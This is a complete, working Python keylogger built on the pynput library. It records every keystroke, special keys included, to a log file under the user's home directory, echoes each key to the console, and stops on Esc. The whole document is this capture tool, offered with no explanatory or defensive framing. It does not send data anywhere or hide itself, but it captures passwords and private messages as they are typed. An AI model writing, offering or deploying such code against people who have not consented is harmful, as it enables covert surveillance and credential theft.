from pynput import keyboard
import datetime
import os

log_file = "keylog.txt"
log_dir = os.path.join(os.path.expanduser('~'), 'keylogs')  # Create a directory for keylogs

def create_log_dir():
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

def on_press(key):
    try:
        with open(os.path.join(log_dir, log_file), 'a') as f:
            f.write(str(key.char))
            print(f"Logged key: {key.char}")  # Debug output
    except AttributeError:
        with open(os.path.join(log_dir, log_file), 'a') as f:
            f.write(f" [{str(key)}] ")
            print(f"Logged special key: {key}")  # Debug output

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def main():
    create_log_dir()
    print("Starting keylogger...")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()